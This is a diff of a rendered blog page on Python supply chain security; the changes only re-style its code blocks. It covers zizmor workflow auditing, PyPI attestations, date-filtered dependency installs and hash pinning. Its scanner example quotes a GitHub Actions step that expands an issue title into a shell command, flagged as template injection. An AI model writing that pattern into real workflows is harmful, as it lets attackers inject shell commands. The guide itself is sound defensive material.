+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uvx</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> zizmor</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> .</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Scan with a GitHub token for online checks (detects impostor commits, known CVEs in actions)</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uvx</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> zizmor</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --gh-token</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> $(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">gh</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> auth</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> token</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">)</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> .</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Output as JSON or SARIF for CI integration</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uvx</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> zizmor</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --format=sarif</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> .</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5"> ></span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> results.sarif</span></span></code></pre></div><p>Example output:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span>warning[excessive-permissions]: overly broad permissions</span></span>
+<span class="line"><span>  --> .github/workflows/ci.yml:4:1</span></span>
+<span class="line"><span>   |</span></span>
+<span class="line"><span> 4 | permissions: write-all</span></span>
+<span class="line"><span>   | ^^^^^^^^^^^^^^^^^^^^^ this permission is overly broad</span></span>
+<span class="line"><span>   |</span></span>
+<span class="line"><span>   = note: audit confidence → High</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>error[template-injection]: code injection via template expansion</span></span>
+<span class="line"><span>  --> .github/workflows/comment.yml:15:9</span></span>
+<span class="line"><span>   |</span></span>
+<span class="line"><span>15 |     run: echo "${{ github.event.issue.title }}"</span></span>
+<span class="line"><span>   |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ attacker-controlled input in run step</span></span></code></pre></div><p>Add it to your pre-commit hooks to catch issues before they&rsquo;re pushed:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># .pre-commit-config.yaml</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">-</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> repo</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> https://github.com/zizmorcore/zizmor-pre-commit</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  rev</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> v1.22.0</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  hooks</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> id</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> zizmor</span></span></code></pre></div><p>Or run it in CI to audit workflows on every PR. The
 <a href=https://github.com/zizmorcore/zizmor-action target=_blank rel="noopener noreferrer">official zizmor action</a>
 uploads findings to GitHub&rsquo;s Security tab via
-SARIF:</p><div class=code-block-wrapper><pre><code class=language-yaml>name: Audit GitHub Actions
-on:
-  push:
-    branches: [&#34;main&#34;]
-  pull_request:
-
-permissions: {}
-
-jobs:
-  zizmor:
-    runs-on: ubuntu-latest
-    permissions:
-      security-events: write
-      contents: read
-      actions: read
-    steps:
-      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
-        with:
-          persist-credentials: false
-      - uses: zizmorcore/zizmor-action@71321a20a9ded102f6e9ce5718a2fcec2c4f70d8 # v0.5.2</code></pre></div><p>Key audits relevant to supply chain security:</p><ul><li><strong>template-injection</strong> — <code>${{ }}</code> expansion with attacker-controlled input enables shell injection,</li><li><strong>unpinned-uses</strong> — actions referenced by tag instead of SHA can be hijacked,</li><li><strong>excessive-permissions</strong> — over-scoped <code>GITHUB_TOKEN</code> increases blast radius,</li><li><strong>use-trusted-publishing</strong> — flags workflows still using long-lived PyPI tokens instead of OIDC,</li><li><strong>impostor-commit</strong> — detects fork commits masquerading as main repo commits (requires <code>--gh-token</code>),</li><li><strong>known-vulnerable-actions</strong> — flags actions with publicly disclosed CVEs.</li></ul><p>zizmor also has <a href="https://marketplace.visualstudio.com/items?itemName=zizmor.zizmor-vscode" target=_blank rel="noopener noreferrer">VS Code integration</a>
+SARIF:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">name</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> Audit GitHub Actions</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387">on</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  push</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    branches</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"main"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  pull_request</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">permissions</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> {}</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">jobs</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  zizmor</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    runs-on</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> ubuntu-latest</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    permissions</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">      security-events</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> write</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">      contents</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> read</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">      actions</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> read</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    steps</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # v6.0.2</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">        with</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">          persist-credentials</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387"> false</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> zizmorcore/zizmor-action@71321a20a9ded102f6e9ce5718a2fcec2c4f70d8</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # v0.5.2</span></span></code></pre></div><p>Key audits relevant to supply chain security:</p><ul><li><strong>template-injection</strong> — <code>${{ }}</code> expansion with attacker-controlled input enables shell injection,</li><li><strong>unpinned-uses</strong> — actions referenced by tag instead of SHA can be hijacked,</li><li><strong>excessive-permissions</strong> — over-scoped <code>GITHUB_TOKEN</code> increases blast radius,</li><li><strong>use-trusted-publishing</strong> — flags workflows still using long-lived PyPI tokens instead of OIDC,</li><li><strong>impostor-commit</strong> — detects fork commits masquerading as main repo commits (requires <code>--gh-token</code>),</li><li><strong>known-vulnerable-actions</strong> — flags actions with publicly disclosed CVEs.</li></ul><p>zizmor also has <a href="https://marketplace.visualstudio.com/items?itemName=zizmor.zizmor-vscode" target=_blank rel="noopener noreferrer">VS Code integration</a>
 and can
 run as an LSP server (<code>zizmor --lsp</code>) for real-time feedback in any editor.</p><h4 id=package-attestations>Package Attestations
 <a class=heading-link href=#package-attestations><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
@@ -600,23 +600,23 @@ run as an LSP server (<code>zizmor --lsp</code>) for real-time feedback in any e
 ,
 following <a href=https://peps.python.org/pep-0740/ target=_blank rel="noopener noreferrer">PEP 740</a>
 (Index support for digital attestations). Since PyPA publish
-action v1.11.0, attestations are generated automatically:</p><div class=code-block-wrapper><pre><code class=language-yaml>  - uses: pypa/gh-action-pypi-publish@7f25271a4aa483500f742f9492b2ab5648d61011 # v1.12.4
-  # Attestations generated automatically since v1.11.0</code></pre></div><p>Abridged attestation metadata links packages to source repositories:</p><div class=code-block-wrapper><pre><code class=language-json>{
-  &#34;predicateType&#34;: &#34;https://docs.pypi.org/attestations/publish/v1&#34;,
-  &#34;subject&#34;: [
-    {
-      &#34;name&#34;: &#34;package-1.0.0.tar.gz&#34;,
-      &#34;digest&#34;: {
-        &#34;sha256&#34;: &#34;d667207822...&#34;
-      }
-    }
-  ],
-  &#34;predicate&#34;: {
-    &#34;repository&#34;: &#34;https://github.com/user/package&#34;,
-    &#34;workflow&#34;: &#34;.github/workflows/publish.yml&#34;,
-    &#34;commit&#34;: &#34;a1b2c3d4e5f6...&#34;
-  }
-}</code></pre></div><p>Adoption is growing rapidly. By end of 2025,
+action v1.11.0, attestations are generated automatically:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pypa/gh-action-pypi-publish@7f25271a4aa483500f742f9492b2ab5648d61011</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # v1.12.4</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">  # Attestations generated automatically since v1.11.0</span></span></code></pre></div><p>Abridged attestation metadata links packages to source repositories:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">{</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">predicateType</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "https://docs.pypi.org/attestations/publish/v1"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">subject</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    {</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "package-1.0.0.tar.gz"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">digest</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> {</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">        "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">sha256</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "d667207822..."</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  ],</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">predicate</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> {</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">repository</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "https://github.com/user/package"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">workflow</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> ".github/workflows/publish.yml"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">commit</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "a1b2c3d4e5f6..."</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">}</span></span></code></pre></div><p>Adoption is growing rapidly. By end of 2025,
 <a href=https://blog.pypi.org/posts/2025-12-31-pypi-2025-in-review/ target=_blank rel="noopener noreferrer">50,000+ projects used Trusted Publishing and 17% of uploads included attestations</a>
 .
 Trusted Publishing also
@@ -667,11 +667,11 @@ discover obvious threats:</p><pre class=mermaid>timeline
 <a class=heading-link href=#for-individual-developers><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h4><p>Modern tools support time-based filtering. uv has <code>--exclude-newer</code>, and pip v26 introduced <code>--uploaded-prior-to</code> with
 the same purpose (both rely on upload-time metadata from <a href=https://peps.python.org/pep-0700/ target=_blank rel="noopener noreferrer">PEP 700</a>
-):</p><div class=code-block-wrapper><pre><code class=language-bash># uv: only use packages published before a specific date
-uv pip compile --exclude-newer 2026-03-02 requirements.in -o requirements.txt
-
-# pip v26+: equivalent functionality
-pip install --uploaded-prior-to 2026-03-02T00:00:00Z -r requirements.txt</code></pre></div><p>This provides a buffer period that can help catch obvious malicious packages before they reach your systems. Think of it
+):</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># uv: only use packages published before a specific date</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> compile</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --exclude-newer</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> 2026-03-02</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.in</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> -o</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># pip v26+: equivalent functionality</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> install</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --uploaded-prior-to</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> 2026-03-02T00:00:00Z</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> -r</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span></span></code></pre></div><p>This provides a buffer period that can help catch obvious malicious packages before they reach your systems. Think of it
 as letting others be the &ldquo;canaries in the coal mine.&rdquo; Note that both flags rely on the package index reporting accurate
 upload timestamps — they&rsquo;re one layer, not a guarantee.</p><p><strong>Limitations</strong>: Delayed ingestion won&rsquo;t catch sophisticated attacks that evade detection, doesn&rsquo;t protect against
 vulnerabilities in packages you&rsquo;re already using, and delays access to security patches (you might need to expedite
@@ -807,7 +807,7 @@ prioritized by impact and ease of implementation:</p><pre class=mermaid>graph TD
     style Phase3 fill:#058dc7,stroke:#046a9c,color:#fff
 </pre><h4 id=phase-1-quick-wins>Phase 1: Quick Wins
 <a class=heading-link href=#phase-1-quick-wins><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h4><p>Start here for immediate security improvements with minimal effort:</p><ol><li><p><strong>Add Ruff security linting</strong> to catch common vulnerabilities in your code:</p><div class=code-block-wrapper><pre><code class=language-bash>uvx ruff check --select S .  # Just security rules to start</code></pre></div><p>Once you&rsquo;re comfortable, expand to <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">lint</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">select </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"ALL"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code> for broader coverage.</p></li><li><p><strong>Pin your dependencies</strong> with hash verification:</p><div class=code-block-wrapper><pre><code class=language-bash>uv pip compile --generate-hashes pyproject.toml -o requirements.txt</code></pre></div></li></ol><h4 id=phase-2-foundations>Phase 2: Foundations
+<span class=sr-only>Link to heading</span></a></h4><p>Start here for immediate security improvements with minimal effort:</p><ol><li><p><strong>Add Ruff security linting</strong> to catch common vulnerabilities in your code:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uvx</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> ruff</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> check</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --select</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> S</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> .</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">  # Just security rules to start</span></span></code></pre></div><p>Once you&rsquo;re comfortable, expand to <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">lint</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">select </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">"ALL"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span></code> for broader coverage.</p></li><li><p><strong>Pin your dependencies</strong> with hash verification:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">uv</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> compile</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --generate-hashes</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pyproject.toml</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> -o</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> requirements.txt</span></span></code></pre></div></li></ol><h4 id=phase-2-foundations>Phase 2: Foundations
 <a class=heading-link href=#phase-2-foundations><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h4><p>Build the foundation for ongoing security:</p><ol><li><strong>Add pip-audit to CI</strong> to catch vulnerabilities before they reach production.</li><li><strong>Generate SBOMs</strong> at build time to know what&rsquo;s deployed.</li><li><strong>Enable Dependabot</strong> or similar tools for automated dependency updates.</li><li><strong>Switch to Trusted Publishing</strong> to eliminate credential theft risk.</li></ol><h4 id=phase-3-advanced>Phase 3: Advanced
 <a class=heading-link href=#phase-3-advanced><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
